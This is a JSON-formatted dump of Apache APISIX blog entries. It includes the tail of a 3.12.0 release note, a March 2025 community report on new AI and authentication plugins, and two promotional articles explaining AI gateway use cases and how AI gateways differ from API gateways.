instances.\\n\\nFor more information, see PR [#11986](https://github.com/apache/apisix/pull/11986).\\n\\n### Add `ai-rate-limiting` plugin\\n\\nThe `ai-rate-limiting` plugin introduces LLM instance-specific rate limiting strategies, allowing fine-grained control over API usage based on workload demands. This helps prevent excessive resource consumption while maintaining optimal model performance.\\n\\nFor more information, see PR [#12037](https://github.com/apache/apisix/pull/12037) and [#12047](https://github.com/apache/apisix/pull/12047).\\n\\n### Add `ai-prompt-guard` plugin\\n\\nThe new `ai-prompt-guard` plugin provides security and content moderation for LLM-generated responses by filtering harmful or undesired prompts. This feature is useful in applications that require input sanitization to prevent misuse of LLMs.\\n\\nFor more information, see PR [#12008](https://github.com/apache/apisix/pull/12008).\\n\\n### Add `ai-rag` plugin\\n\\nThe `ai-rag` plugin supports retrieval-augmented generation (RAG) workflows by integrating external knowledge retrieval with LLM responses. This enhances LLM-generated content by incorporating relevant factual data.\\n\\nFor more information, see PR [#11568](https://github.com/apache/apisix/pull/11568).\\n\\n### Add `ai-content-moderation` plugin\\n\\nThe `ai-content-moderation` plugin integrates with AWS Comprehend to help enforce content policies by filtering harmful or inappropriate LLM-generated content. This is useful for compliance and content safety applications.\\n\\nFor more information, see PR [#11541](https://github.com/apache/apisix/pull/11541).\\n\\n### Support the use of system-provided certificates in `ssl_trusted_certificate`\\n\\nAPISIX now allows the use of system-provided SSL certificates by setting `ssl_trusted_certificate` to system in the configuration file. This simplifies certificate management for environments that use system-provided CA bundles.\\n\\nFor more information, see PR [#11809](https://github.com/apache/apisix/pull/11809).\\n\\n### Support execution of custom logic in plugins\\n\\nA new `_meta.pre_function` attribute has been introduced in plugins to allow executing custom logic before each request processing phase. This feature provides greater control over request handling, enabling pre-processing tasks such as variable registration.\\n\\nFor more information, see PR [#11793](https://github.com/apache/apisix/pull/11793).\\n\\n### Support anonymous consumer\\n\\nAPISIX now supports an \u201canonymous\u201d consumer, which can be assigned to requests that do not match any existing consumer during authentication. This is particularly useful for scenarios where certain endpoints need to allow unauthenticated access while still applying consumer-based policies.\\n\\nFor more information, see PR [#11917](https://github.com/apache/apisix/pull/11917).\\n\\n### Add `valid_issuers` attribute in `openid-connect` plugin\\n\\nThe `openid-connect` plugin now supports a `valid_issuers` attribute for whitelisting trusted JWT issuers. When not configured, the plugin will validate using issuers returned in the discovery document will be used. If both are missing, the issuer will not be validated.\\n\\nFor more information, see PR [#12002](https://github.com/apache/apisix/pull/12002).\\n\\n### Store JWT in the request context in `jwt-auth` plugin\\n\\nAPISIX now supports the storage of JWT tokens in the request context, allowing other plugins to access token details without needing to re-parse them. This improves efficiency when working with authentication and authorization plugins.\\n\\nFor more information, see PR [#11675](https://github.com/apache/apisix/pull/11675).\\n\\n### Support configuring `key_claim_name` in `jwt-auth` plugin\\n\\nThe JWT authentication plugin now allows customization of the `key_claim_name`, providing flexibility in extracting user identifiers from JWT claims.\\n\\nFor more information, see PR [#11772](https://github.com/apache/apisix/pull/11772).\\n\\n### Cuztomize rate limiting response header names\\n\\nUsers can now customize rate limiting response header names, allowing flexibility in how rate-limiting information is exposed to clients. This change helps tailor responses to meet specific application needs.\\n\\nFor more information, see PR [#11831](https://github.com/apache/apisix/pull/11831).\\n\\n### Support multipart content-type in `body-transformer` plugin\\n\\nThe `body-transformer` plugin now supports multipart requests, enabling transformation of file uploads and other multipart payloads.\\n\\nFor more information, see PR [#11767](https://github.com/apache/apisix/pull/11767).\\n\\n## Other Updates\\n\\n- Return errors at authentication failure instead of logging in `multi-auth` plugin (PR [#11775](https://github.com/apache/apisix/pull/11775))\\n- Add Total Requests per Second (TPS) Panel to Grafana Dashboard (PR [#11692](https://github.com/apache/apisix/pull/11692))\\n- Resync etcd when a lower revision is detected to ensure data consistency (PR [#12015](https://github.com/apache/apisix/pull/12015))\\n- Remove the `stream` default value in `ai-proxy` to prevent unintended behavior (PR [#12013](https://github.com/apache/apisix/pull/12013))\\n- Fix `gRPC-web` response two trailer chunks, ensuring proper response formatting (PR [#11988](https://github.com/apache/apisix/pull/11988))\\n- Resolve `event_id` being nil in the `chaitin-waf` plugin, improving logging accuracy (PR [#11651](https://github.com/apache/apisix/pull/11651))\\n- Fix race condition when updating `upstream.nodes` to prevent unexpected behavior (PR [#11916](https://github.com/apache/apisix/pull/11916))\\n- Ensure `upstream_obj.upstream` is not a string to maintain data integrity (PR [#11932](https://github.com/apache/apisix/pull/11932))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#3120)."},{"id":"2025 Monthly Report (March 01 - March 31)","metadata":{"permalink":"/blog/2025/03/31/2025-march-monthly-report","source":"@site/blog/2025/03/31/2025-march-monthly-report.md","title":"2025 Monthly Report (March 01 - March 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-03-31T00:00:00.000Z","formattedDate":"March 31, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":5.17,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.12.0","permalink":"/blog/2025/04/01/release-apache-apisix-3.12.0"},"nextItem":{"title":"6 Essential AI Gateway Use Cases","permalink":"/blog/2025/03/24/6-essential-ai-gateway-use-cases"}},"content":"> We have recently added some new features within Apache APISIX, including adding support for `ai-prompt-guard`, `ai-rate-limiting`, and `ai-request-rewrite` plugins, and some new/enhanced features like adding JWT Audience Validator in the `openid-connect` plugin. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom March 1st to March 31st, 14 contributors made 50 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/03/31/fDYTi9Vu_march-contributor-list.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/03/31/NB9qpu7Q_mar-new-contributors.webp)\\n\\n## Good First Issue\\n\\n### Improve Schema of `chaitin-waf` Plugin\\n\\nIssue: https://github.com/apache/apisix/issues/12098\\n\\nConsider the comments of [PR #12029](https://github.com/apache/apisix/pull/12029#discussion_r2018012041) for the `chaitin-waf` plugin. The value `nil` of `enum` can be removed since the default value is already set to `nil`.\\n\\n## Feature Highlights\\n\\n### 1. Add `ai-prompt-guard` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12008\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThe `ai-prompt-guard` plugin safeguards your AI endpoints by inspecting and validating incoming prompt messages. It checks the content of requests against user-defined allowed and denied patterns to ensure that only approved inputs are processed. Based on its configuration, the plugin can either examine just the latest message or the entire conversation history, and it can be set to check prompts from all roles or only from end users.\\n\\n### 2. Add `ai-rate-limiting` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12037\\n\\nContributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek)\\n\\nThe `ai-rate-limiting` plugin enforces token-based rate limiting for requests sent to LLM services. It helps manage API usage by controlling the number of tokens consumed within a specified time frame, ensuring fair resource allocation and preventing excessive load on the service. It is often used with the `ai-proxy-multi` plugin.\\n\\n### 3. Add `ai-request-rewrite` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12036\\n\\nContributor: [LiteSun](https://github.com/LiteSun)\\n\\nThe `ai-request-rewrite` plugin leverages predefined prompts and AI services to intelligently modify client requests, enabling AI-powered content transformation before forwarding to upstream services.\\n\\n### 4. Support Proxying OpenAI-Compatible LLMs\\n\\nPR: https://github.com/apache/apisix/pull/12004\\n\\nContributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek)\\n\\nThis PR introduces a new provider, `openai-compatible`, that can proxy requests to OpenAI-compatible LLMs.\\n\\n### 5. Store JWT in the Request Context in `jwt-auth` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/11675\\n\\nContributor: [mikyll](https://github.com/mikyll)\\n\\nThe `jwt-auth` plugin now has a new parameter: `store_in_ctx`. It allows the configuration of when enabled (default is false), it stores the validated JWT object in the request context.\\n\\nThis feature is especially beneficial for two reasons:\\n\\n- The JWT can be removed from request attributes when `hide_credential = true`, which offers a secure alternative for token passing without exposure.\\n\\n- Do not require users to develop custom code to retrieve and parse JWT objects.\\n\\n### 6. Add JWT Audience Validator in `openid-connect` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/11987\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nAdd JWT audience authentication to the `openid-connect` plugin to:\\n\\n- Allow the configuration of the audience claim to enforce validation of the JWT Audience Validator.\\n\\n- Asserts that it should be equal to or contain the `client_id`  when the `client_id` is a string or an array, respectively, to comply with the OIDC specification requirements; otherwise, rejects the request.\\n\\n- Allows customization of the claim name.\\n\\nDirectly implemented in plugin code since jwt-validators only supports local verification, not the Introspection API. Features are disabled by default for compatibility. Users can enable them as needed.\\n\\n### 7. Set the Default Value of `ssl_trusted_certificate` to `system`\\n\\nPR: https://github.com/apache/apisix/pull/11993\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nWhen testing AI plugins, we found that `ssl_trusted_certificate` must be set to `system`; otherwise, APISIX reports \\"unable to get local issuer certificate\\" when accessing external AI services.\\n\\nThis PR:\\n\\n- Moves schema validation into `read_yaml_conf` for consistency, with `local_conf` now just calling `read_yaml_conf` internally and adding caching.\\n\\n- Ensures schema validation happens first when reading YAML files, setting the default trusted certificate value to `system` before overrides (including replacing `system` with certificate paths).\\n\\n- Removes support for combining multiple certificates.\\n\\n### 8. Add `valid_issuers` Field in `openid-connect` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12002\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nAdds a field `valid_issuers` when JWKs are used to verify the issuer of the JWT, which whitelists the vetted issuers of the JWT. When not passed by the user, the issuer returned by the discovery endpoint will be used. If both are missing, the issuer will not be validated.\\n\\n### 9. Implement Rate-Limiting based on Fallback Strategy in `ai-proxy-multi` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12047\\n\\nContributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek)\\n\\nIn a previous refactor PR, the fallback strategy was removed to accommodate the `ai-rate-limiting` plugin. This PR introduces a fallback strategy that fits well with the rate-limiting construction in the `ai-proxy-multi` plugin.\\n\\n### 10. Support Embeddings API in `ai-proxy` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12062\\n\\nContributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek)\\n\\nThis PR adds support for proxying to the embedding models in the `ai-proxy` and `ai-proxy-multi` Plugins.\\n\\n### 11. Support `404` Response Code in `ip-restriction` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12076\\n\\nContributor: [papdaniel](https://github.com/papdaniel)\\n\\nSupport 404 response code to hide the route from non-whitelisted sources.\\n\\n### 12. Extend `chaitin-waf` Plugin Functionalities\\n\\nPR: https://github.com/apache/apisix/pull/12029\\n\\nContributor: [AlyHKafoury](https://github.com/AlyHKafoury)\\n\\nThis PR adds a configuration for the `mode` attribute, adds a configuration to enable/disable the real client IP, and uses `lrucache` to cache the var expression result.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials, and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences.\\n\\n## Recommended Blogs\\n\\n- [Comprehensive Overview of APISIX AI Gateway Features](https://apisix.apache.org/blog/2025/02/24/apisix-ai-gateway-features/)\\n  \\n  This article will provide an in-depth look at the AI gateway features of the current and upcoming versions of APISIX. As a multifunctional API and AI gateway, Apache APISIX offers efficient and secure LLM API calls for AI applications.\\n  \\n- [What Is an AI Gateway? Concept and Core Features](https://apisix.apache.org/blog/2025/03/06/what-is-an-ai-gateway/)\\n\\n  This article will explore how the AI gateway addresses pressing API gateway concerns. Let\'s discover how AI gateways unlock the full potential of AI, turning challenges into opportunities for growth.\\n\\n- [What Is an AI Gateway: Differences from API Gateway](https://apisix.apache.org/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained/)\\n\\n  *\\"The future isn\'t AI gateways\u2014it\'s API gateways that speak AI.\\"* This blog explores AI gateways, their differences from API gateways, and why evolved solutions like Apache APISIX AI Gateway are shaping the future."},{"id":"6 Essential AI Gateway Use Cases","metadata":{"permalink":"/blog/2025/03/24/6-essential-ai-gateway-use-cases","source":"@site/blog/2025/03/24/6-essential-ai-gateway-use-cases.md","title":"6 Essential AI Gateway Use Cases","description":"Discover 6 crucial AI gateway use cases that enhance efficiency, security, and cost management for modern enterprises leveraging AI technologies.","date":"2025-03-24T00:00:00.000Z","formattedDate":"March 24, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.45,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"2025 Monthly Report (March 01 - March 31)","permalink":"/blog/2025/03/31/2025-march-monthly-report"},"nextItem":{"title":"What Is an AI Gateway: Differences from API Gateway","permalink":"/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained"}},"content":">Let\'s explore the six common application scenarios where AI gateways deliver significant value to modern enterprises.\\n\x3c!--truncate--\x3e\\n\\n## How AI Gateways Address Modern Enterprise Needs\\n\\nThe adoption of artificial intelligence technologies has grown unprecedentedly across industries. From healthcare to finance, retail to manufacturing, organizations are increasingly integrating AI and machine learning models into their core operations. This rapid expansion has created significant challenges in managing AI/ML APIs at scale.\\n\\nDevelopers and enterprises face complex issues when deploying AI services:\\n\\n- **Complexity Management**: Coordinating multiple AI models and services across different departments\\n- **Performance Optimization**: Ensuring low latency and high availability for AI-powered applications\\n- **Cost Control**: Managing expenses associated with API calls and computational resources\\n- **Security Compliance**: Meeting regulatory requirements while protecting sensitive data\\n- **Scalability**: Supporting growing user bases and increasing AI workloads\\n\\nAn [AI gateway](https://apisix.apache.org/blog/2025/03/06/what-is-an-ai-gateway/) serves as critical middleware that manages, secures, and optimizes interactions between applications and AI services such as large language models (LLMs), vision APIs, and other machine learning models. It acts as a centralized control point for all AI traffic, providing essential capabilities that enhance the efficiency, security, and reliability of AI implementations.\\n\\nWith this foundation in place, let\'s explore the six common application scenarios where AI gateways deliver significant value to modern enterprises.\\n\\n## 1. Centralized AI Service Management\\n\\nModern enterprises increasingly rely on diverse AI models to address varied business needs, from customer-facing chatbots to internal document analysis. However, managing multiple vendors (e.g., OpenAI, Anthropic, Mistral) and deployment environments (cloud, on-prem, hybrid) introduces operational chaos.\\n\\n![Centralized AI Service Management](https://static.api7.ai/uploads/2025/08/01/vwfP6Mwx_centralized-ai-gateway.webp)\\n\\nEnterprises adopt specialized models for specific tasks:\\n\\n- **GPT-4**: High-quality text generation for customer support.\\n- **Claude 2.1**: Precision in legal document review.\\n- **Mistral 7B**: Cost-effective translation or summarization.\\n\\n**Key Challenges:**\\n\\n1. **Vendor Lock-In**: Hardcoding API endpoints for each provider limits flexibility.\\n2. **Operational Overhead**: Managing rate limits, authentication, and error handling across vendors.\\n3. **Inconsistent Performance**: Latency spikes or outages from a single provider disrupt workflows.\\n\\nUnder such circumstances, AI gateways provide a unified control plane for managing diverse AI services, regardless of their underlying infrastructure or deployment location. This centralized approach simplifies the complexity of managing multiple models from different providers.\\n\\nBesides, AI gateways excel in managing these multi-model environments by enabling seamless switching and load balancing between different models based on factors like cost, latency, and performance. This centralized management becomes increasingly valuable as organizations scale their AI usage across departments and applications.\\n\\n## 2. Enforcing Security and Compliance\\n\\nAI implementations, particularly in regulated industries like finance and healthcare, demand rigorous security and compliance measures. AI gateways act as critical enforcement points, ensuring that sensitive data and model interactions adhere to organizational policies and regulatory frameworks.\\n\\n**The Challenge: Securing AI at Scale**\\n\\nAI models often process sensitive data, exposing organizations to risks like:\\n\\n- **Data Breaches**: Unauthorized access to Personally Identifiable Information (PII) or Protected Health Information (PHI).\\n- **Regulatory Penalties**: Non-compliance with GDPR, HIPAA, or PCI-DSS.\\n- **Model Abuse**: Malicious inputs (e.g., prompt injection attacks) or harmful outputs (e.g., biased recommendations).\\n\\nThey implement comprehensive security measures including:\\n\\n- **Authentication (AuthN)**: Verifying identities of applications accessing AI models\\n- **Authorization (AuthZ)**: Controlling access levels to specific model capabilities\\n- **Content Filtering**: Blocking harmful inputs and inappropriate outputs\\n- **Data Privacy Protections**: Ensuring compliance with regulations like GDPR and HIPAA\\n\\nAI gateways transform security from an afterthought to a foundational layer. By centralizing enforcement of AuthN/AuthZ, data privacy, and content policies, they enable organizations to harness AI\u2019s potential without compromising compliance.\\n\\n## 3. Cost Optimization and Rate Limiting\\n\\nAI services, particularly those based on large language models, can incur significant costs, especially with high-volume usage. AI gateways help organizations manage these costs through:\\n\\n- **Token-based Rate Limiting**: Preventing API abuse by controlling request volumes\\n- **Budget Enforcement**: Setting spending limits for different teams or applications\\n- **Caching Strategies**: Reducing redundant calls by storing frequent responses\\n\\n![Cost Optimization and Rate Limiting](https://static.api7.ai/uploads/2025/08/01/D0JOkr1h_cost-optimization-and-rate-limiting.webp)\\n\\nFor instance, a customer service application might cache common questions about password resets or refund processes, significantly reducing the number of model invocations needed.\\n\\nAs AI adoption continues to accelerate, we can expect AI gateways to evolve with even more sophisticated cost management capabilities:\\n\\n- **Predictive Budgeting**: Using machine learning to forecast AI spending patterns\\n- **Automated Model Selection**: Dynamically choosing the most cost-effective model for each request\\n- **Cross-provider Optimization**: Managing costs across multiple AI service providers simultaneously\\n- **Carbon-Aware Routing**: Directing requests to environmentally sustainable infrastructure options\\n\\nBy implementing these advanced cost optimization and rate-limiting strategies, businesses can ensure their AI investments deliver maximum value while remaining aligned with financial objectives.\\n\\n## 4. Performance Monitoring and Analytics\\n\\nAI services, particularly those based on large language models (LLMs) and other complex neural networks, operate as \\"black boxes\\" that can be difficult to monitor and optimize.\\n\\nWithout proper visibility, organizations risk:\\n\\n- Deploying underperforming models that affect user experience\\n- Wasting resources on inefficient or redundant services\\n- Missing opportunities for cost optimization\\n- Failing to detect model drift or degradation over time\\n\\nAI gateways address these challenges by providing comprehensive monitoring and analytics capabilities specifically designed for AI workloads. They track:\\n\\n- **Latency Metrics**: Identifying slow-performing models\\n- **Error Rates**: Detecting model degradation or API issues\\n- **Usage Patterns**: Understanding which services are most utilized\\n- **Model Performance**: Comparing effectiveness across different implementations\\n\\nThese analytics help organizations make data-driven decisions about model selection, vendor choices, and resource allocation.\\n\\n## 5. Hybrid AI Deployments\\n\\nMany organizations use a combination of cloud-based AI services and on-premises models. This approach allows them to balance cost, performance, security, and compliance requirements across different workloads.\\n\\nAI gateways facilitate seamless integration across various environments, managing:\\n\\n- **Traffic Routing**: Directing requests to the most appropriate deployment\\n- **Consistent Policies**: Applying security and compliance standards uniformly\\n- **Failover Mechanisms**: Ensuring continuity when one environment experiences issues\\n\\nAI gateways implement hybrid AI deployments through multi-cluster orchestration, integrating with Kubernetes to enable uniform service discovery, consistent configuration management, and centralized logging across environments. They extend to edge devices with specialized routing policies, offline processing capabilities, and firmware management to support low-latency requirements.\\n\\nAdditionally, AI gateways provide cross-cloud visibility by aggregating metrics, tracking costs, and synchronizing security policies across major cloud providers, creating a unified management layer for complex AI infrastructure.\\n\\n## 6. Version Control and Canary Deployments\\n\\nAs AI models evolve, organizations need robust mechanisms for updating implementations without disrupting services. AI gateways provide critical capabilities for managing model versions, enabling controlled rollouts, and validating performance before full-scale deployment.\\n\\nUpdating AI models in production presents several risks:\\n\\n- **Performance Degradation**: New models may not perform as expected in production environments\\n- **Backward Compatibility Issues**: Changes may break existing applications or workflows\\n- **Data Drift**: Model performance may degrade if input data characteristics change\\n- **Regulatory Requirements**: Some industries require rigorous testing and documentation before model updates\\n\\nAI gateways address these challenges through sophisticated version management and deployment strategies, including:\\n\\n- **Version Management**: Tracking and routing requests to specific model versions\\n- **Canary Deployments**: Gradually rolling out updates to a subset of users\\n- **A/B Testing**: Comparing performance between model versions\\n\\nThis capability reduces risk during model updates and helps organizations validate improvements before full-scale deployment.\\n\\n## Conclusion\\n\\nAI gateways have emerged as essential infrastructure for organizations looking to harness AI capabilities effectively. By providing centralized management, enforcing security policies, optimizing costs, delivering performance insights, supporting hybrid deployments, and enabling controlled model updates, AI gateways help organizations navigate the complexities of modern AI implementations.\\n\\nAs AI adoption continues to grow across industries, these gateways will play an increasingly critical role in ensuring that AI services remain secure, efficient, and aligned with business objectives.\\n\\nRead more about [Apache APISIX AI Gateway](https://apisix.apache.org/blog/2025/02/24/apisix-ai-gateway-features/) and the [differences between AI gateways and API gateways](https://apisix.apache.org/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained/)."},{"id":"What Is an AI Gateway: Differences from API Gateway","metadata":{"permalink":"/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained","source":"@site/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained.md","title":"What Is an AI Gateway: Differences from API Gateway","description":"Explore the evolution of AI gateways vs API gateways, their unique challenges, and how Apache APISIX is shaping the future of AI workloads.","date":"2025-03-21T00:00:00.000Z","formattedDate":"March 21, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.125,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"6 Essential AI Gateway Use Cases","permalink":"/blog/2025/03/24/6-essential-ai-gateway-use-cases"},"nextItem":{"title":"What Is an AI Gateway? Concept and Core Features","permalink":"/blog/2025/03/06/what-is-an-ai-gateway"}},"content":">_\\"The future isn\'t AI gateways\u2014it\'s API gateways that speak AI.\\"_ This blog explores AI gateways, their differences from API gateways, and why evolved solutions like [Apache APISIX AI Gateway](https://apisix.apache.org/blog/2025/02/24/apisix-ai-gateway-features/) are shaping the future.\\n\x3c!--truncate--\x3e\\n\\n## What Is an AI Gateway? Why Did It Arise in the AI Era?\\n\\nThe AI era has ushered in unprecedented complexity in deploying and managing artificial intelligence (AI) models. Organizations now juggle multiple models\u2014from computer vision to large language models (LLMs)\u2014across diverse environments (cloud, edge, hybrid). Traditional API gateways, designed for general-purpose data traffic, often fall short in addressing the unique challenges posed by AI workloads. This is where **AI gateways** emerge as critical middleware, acting as a unified control plane for routing, securing, and optimizing AI workloads.\\n\\n## The Rise of AI Gateways\\n\\nThe proliferation of **generative AI and LLMs (Large Language Models)** has introduced unique challenges:\\n\\n- **Token Consumption**: LLMs process requests in tokens, requiring granular tracking for cost and performance optimization.\\n- **Stream-Type Requests**: AI agents often generate real-time, streaming responses (e.g., ChatGPT\'s incremental output), demanding low-latency handling.\\n- **Tool Integration**: AI systems increasingly rely on external data sources and APIs (e.g., retrieving live weather data or CRM records).\\n\\nAccording to a 2023 Gartner report, over 75% of enterprises now use AI models in production, driving demand for specialized infrastructure. Traditional API gateways, designed for RESTful APIs and static request-response cycles, struggle with these AI-specific demands. Enter the [AI gateway](https://apisix.apache.org/blog/2025/03/06/what-is-an-ai-gateway/)\u2014a purpose-built solution to manage AI-native traffic.\\n\\n## AI Agents vs. Traditional Devices: Why Stream-Type Requests Demand Specialized Handling\\n\\nAI agents (e.g., chatbots, coding assistants) generate fundamentally different traffic patterns than traditional clients:\\n\\n| Metric               | Traditional API Requests | AI Agent Requests          |\\n|----------------------|--------------------------|----------------------------|\\n| **Request Type**     | Synchronous (HTTP GET/POST) | Asynchronous, streaming (SSE) |\\n| **Latency**          | Milliseconds             | Seconds-minutes (for chunks)  |\\n| **Billing**          | Per API call             | Per token or compute time   |\\n| **Failure Modes**    | Timeouts, HTTP errors    | Partial completions, hallucinations |\\n\\n### The Stream-Type Challenge\\n\\nWhen an AI agent requests a poem generated by GPT-4, the response is streamed incrementally. Traditional API gateways, built for atomic requests, struggle with:\\n\\n- **Partial Responses**: Aggregating chunks into a coherent audit log.\\n- **Token Accounting**: Accurately counting tokens across streaming chunks.\\n- **Real-Time Observability**: Monitoring latency per token or detecting drift in response quality.\\n\\nMany purpose-built AI gateways lack distributed tracing, forcing engineers to cobble together metrics. In contrast, API gateways like [Apache APISIX](https://github.com/apache/apisix) provide built-in integrations with Prometheus and Grafana, enabling token-level dashboards.\\n\\n## Two Types of AI Gateways: Purpose-Built vs. API Gateway Evolutions\\n\\nToday\'s AI gateways fall into two categories:\\n\\n### Specific Purpose-Built AI Gateways\\n\\nThese are built from the ground up to address AI use cases. Startups like **PromptLayer** and **LangChain** offer solutions focused on:\\n\\n- **Token-Based Rate Limiting**: Enforcing usage quotas based on tokens instead of API calls.\\n- **Prompt Engineering Tools**: Allowing developers to test and optimize prompts.\\n- **AI-Specific Analytics**: Tracking metrics like response hallucination rates or token costs.\\n\\n**Example**: OpenAI\'s API uses token-based pricing ($0.06 per 1K tokens for GPT-4), requiring gateways to meter usage precisely. A dedicated AI gateway might integrate token counters directly into its throttling logic.\\n\\nHowever, these gateways often lack the **observability** and **scalability** of mature API management platforms. For instance, measuring token consumption across distributed microservices can lead to inaccuracies if the gateway lacks distributed tracing capabilities.\\n\\n### Evolved AI Gateways from API Gateways\\n\\nEstablished API gateways like Kong, **[Apache APISIX](https://apisix.apache.org/)**, and AWS API Gateway are adapting to AI workloads by adding:\\n\\n- **Streaming Support**: Handling Server-Sent Events (SSE) and WebSockets for real-time AI responses.\\n- **Token-Aware Plugins**: Extending rate-limiting plugins to track tokens.\\n- **LLM Orchestration**: Managing multiple AI models (e.g., routing requests to cost-effective models like Mistral-7B for simple tasks).\\n\\nMature API gateways leverage decades of experience in security (OAuth, JWT), scalability (load balancing), and monetization\u2014features often missing in AI-first solutions.\\n\\n## Why Evolved AI Gateways Are Winning Long-Term\\n\\nWhile purpose-built AI gateways excel in niche scenarios, evolved API gateways are becoming the default choice for three reasons:\\n\\n1. **Cost Efficiency**: Maintaining separate gateways for AI and non-AI traffic doubles operational overhead. Converged systems reduce costs by 30\u201350% (Gartner, 2023).\\n2. **Flexibility**: Enterprises can\'t predict which AI models will dominate. Platforms like Apache APISIX allow seamless integration of new LLMs without rearchitecting.\\n3. **Future-Proofing**: As AI becomes embedded in all apps (e.g., AI-powered search in e-commerce), gateways must handle hybrid workloads.\\n\\n## Model Context Protocol (MCP): Bridging AI Assistants and External Tools\\n\\nTo connect AI agents with external data and APIs, the **[Model Context Protocol (MCP)](https://github.com/modelcontextprotocol)** has emerged as a standardized framework. MCP defines how AI models request and consume external resources, such as:\\n\\n- **Data Sources**: SQL databases, vector stores (e.g., Pinecone).\\n- **APIs**: CRM systems, payment gateways.\\n- **Tools**: Code interpreters, and image generators.\\n\\n### How MCP Works\\n\\n1. **Context Injection**: An AI assistant sends a request with a context header specifying required tools (`MCP-Context: weather_api, crm`).\\n2. **Gateway Routing**: The AI gateway validates permissions, injects API keys, and routes the request to relevant services.\\n3. **Response Synthesis**: The gateway aggregates API responses (e.g., weather data + CRM contacts) and feeds them back to the AI model.\\n\\n![How MCP Works](https://static.api7.ai/uploads/2025/08/01/zHkQ4hM0_how-mcp-works.webp)\\n\\n**Example**: A user asks, \\"Email our top client in NYC about today\'s weather.\\" The AI gateway uses MCP to:\\n\\n- Fetch the top client from Salesforce.\\n- Retrieve NYC weather from OpenWeatherMap.\\n- Pass this context to GPT-4 to draft the email.\\n\\n### Benefits of MCP\\n\\n- **Security**: Centralized policy enforcement (e.g., masking PII in CRM responses).\\n- **Cost Control**: Caching frequent data requests (e.g., product catalogs).\\n- **Interoperability**: Standardizing AI-to-API communication across vendors.\\n\\n## Future of AI Gateways: Convergence with API Monetization\\n\\nAs AI adoption matures, two trends will shape AI gateways:\\n\\n### Trend 1: The Decline of Standalone AI Gateways\\n\\nNiche AI gateways will struggle to compete with evolved API gateways that offer:\\n\\n- **Unified Governance**: One platform for REST, GraphQL, and AI APIs.\\n- **Monetization Models**: Token-based billing, subscription tiers.\\n- **Enterprise Features**: Role-based access control (RBAC), audit logging.\\n\\nUnder such a trend, AI traffic will flow through traditional API gateways enhanced with AI capabilities.\\n\\n### Trend 2: API Gateways as AI Orchestrators\\n\\nFuture API gateways will act as AI orchestrators, handling:\\n\\n- **Model Routing**: Directing requests to optimal models based on cost, latency, or accuracy.\\n- **Hybrid Workflows**: Blending AI and non-AI services (e.g., validating a GPT-4 response against a database).\\n- **Token Analytics**: Real-time dashboards showing token spend by team or project.\\n\\n### The Bottom Line\\n\\nIn the future, the line between \\"AI gateway\\" and \\"API gateway\\" will blur. But the unchangeable fact is APIs are the basics of API gateways and AI gateways. Companies that adopt AI-ready API gateways today will gain a strategic edge in scalability, cost control, and innovation.\\n\\n## Conclusion: Embracing AI-API Convergence\\n\\nAI gateways are not a replacement but an evolution of API gateways. While purpose-built solutions address immediate LLM challenges, their limitations in observability and scalability make them transitional. Established API gateways\u2014enhanced with streaming support, token-aware plugins, and MCP\u2014are poised to dominate.\\n\\nSolutions like **[Apache APISIX AI Gateway](https://apisix.apache.org/blog/2025/02/24/apisix-ai-gateway-features/)** exemplify this shift, blending AI-native features with battle-tested API management. As AI permeates every app, enterprises must choose platforms that scale beyond siloed use cases. The winners? Adaptable, extensible tools that speak both API and AI."},{"id":"What Is an AI Gateway? Concept and Core 